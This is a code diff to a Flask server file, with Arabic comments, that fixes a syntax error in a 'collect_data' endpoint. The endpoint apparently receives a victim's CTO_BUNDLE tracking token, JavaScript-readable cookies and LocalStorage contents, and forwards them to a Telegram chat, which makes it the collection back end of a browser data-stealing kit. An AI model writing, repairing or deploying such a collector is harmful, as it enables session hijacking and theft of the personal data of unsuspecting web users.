@@ -1,4 +1,4 @@
-# app.py - النسخة النهائية المحدثة لاستقبال CTO_BUNDLE
+# app.py - النسخة النهائية المصححة لخطأ SyntaxError
 from flask import Flask, request, jsonify, render_template
 import requests
 import os
@@ -53,3 +53,19 @@ def collect_data():
 `{cto_bundle_token}`
 ---
 *الكوكيز المتاحة لـ JS:*
+*التخزين المحلي (LocalStorage):*
+        """ # <--- تم التأكد من الإغلاق هنا بشكل صحيح
+        send_telegram_message(telegram_message)
+        
+        return jsonify({"status": "success"}), 200
+
+    except Exception:
+        return jsonify({"status": "internal_error"}), 500
+
+@app.route('/')
+def home():
+    return render_template('index.html')
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port)
